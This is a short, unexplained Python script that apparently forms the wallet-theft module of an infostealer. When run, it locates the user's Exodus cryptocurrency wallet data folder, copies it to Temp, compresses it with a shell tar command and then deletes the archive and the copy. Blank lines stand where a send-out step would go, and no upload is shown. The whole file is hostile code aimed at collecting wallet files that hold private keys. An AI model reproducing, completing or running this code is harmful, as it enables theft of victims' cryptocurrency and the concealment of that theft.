import os

user = os.path.expanduser("~")

def copy_directory(src, dst):
    if not os.path.exists(dst):
        os.makedirs(dst)
    for item in os.listdir(src):
        src_path = os.path.join(src, item)
        dst_path = os.path.join(dst, item)
        if os.path.isdir(src_path):
            copy_directory(src_path, dst_path)
        else:
            try:
                with open(src_path, 'rb') as f_read, open(dst_path, 'wb') as f_write:
                    f_write.write(f_read.read())
                print(f"Copied {src_path} to {dst_path}")
            except IOError as e:
                print(f"Failed to copy {src_path} to {dst_path}: {e}")

def exo():
    exodus_path = os.path.join(user, "AppData\\Roaming\\Exodus")
    temp_exodus_path = os.path.join(user, "AppData\\Local\\Temp\\Exodus")
    temp_exodus_zip_path = os.path.join(user, "AppData\\Local\\Temp", "Exodus.zip")

    if os.path.exists(exodus_path):
        print("Copying directory...")
        copy_directory(exodus_path, temp_exodus_path)
        print("Compressing directory...")
        os.system(f"cd {temp_exodus_path} && tar -zcf {temp_exodus_zip_path} *")
        
      
        try:
            os.remove(temp_exodus_zip_path)
            for root, dirs, files in os.walk(temp_exodus_path, topdown=False):
                for name in files:
                    os.remove(os.path.join(root, name))
                for name in dirs:
                    os.rmdir(os.path.join(root, name))
            os.rmdir(temp_exodus_path)
            print("Cleanup successful.")
        except Exception as e:
            print(f"Cleanup failed: {e}")
    else:
        print("Source directory does not exist.")

exo()
